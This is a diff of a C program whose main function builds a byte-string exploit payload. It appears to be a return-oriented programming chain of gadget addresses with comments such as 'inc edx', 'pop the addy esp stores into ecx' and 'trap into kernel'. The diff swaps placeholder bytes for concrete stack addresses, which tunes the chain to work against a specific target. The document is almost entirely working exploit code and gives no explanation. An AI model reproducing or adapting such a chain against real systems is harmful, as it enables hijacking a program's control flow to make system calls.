@@ -42,14 +42,14 @@ int main(void)
                       "\x8a\xb8\xb7\xbb" // inc edx
                       "\x8a\xb8\xb7\xbb" // inc edx
                       "\x8a\xb8\xb7\xbb" // inc edx now value 3
-                      "\x22\xA4\xBA\xBB\xec\x28\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
+                      "\x22\xA4\xBA\xBB\x74\x29\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (3 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx now value 4
                       "\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb" // edx now 16
-                      "\x22\xA4\xBA\xBB\xec\x28\xbf\xbf" // pop the addy esp stores into ecx (future address of 16 word) 
+                      "\x22\xA4\xBA\xBB\x84\x29\xbf\xbf" // pop the addy esp stores into ecx (future address of 16 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (16 word) to stack
                       "\xD4\xBE\xB3\xBB" // 0 out edx
-                      "\xe1\xa0\xb9\xbb\x01\x01\x01\x01" // pop addy off of stack into eax
+                      "\xe1\xa0\xb9\xbb\x8d\x29\xbf\xbf" // pop addy off of stack into eax
                       "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
                       "\x8C\x9C\xA9\xBB" // inc eax
                       "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
@@ -59,7 +59,7 @@ int main(void)
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x01\x01\x01\x01" // dummy value
                       "\xaa\xaa\xaa\xaa" // four-byte value 3
-                      "\xaa\xaa\xaa\xaa" // addy of x struct
+                      "\x88\x29\xbf\xbf" // addy of x struct
                       "\xaa\xaa\xaa\xaa" // four-byte value 16
                       ""
                       "\xaa"
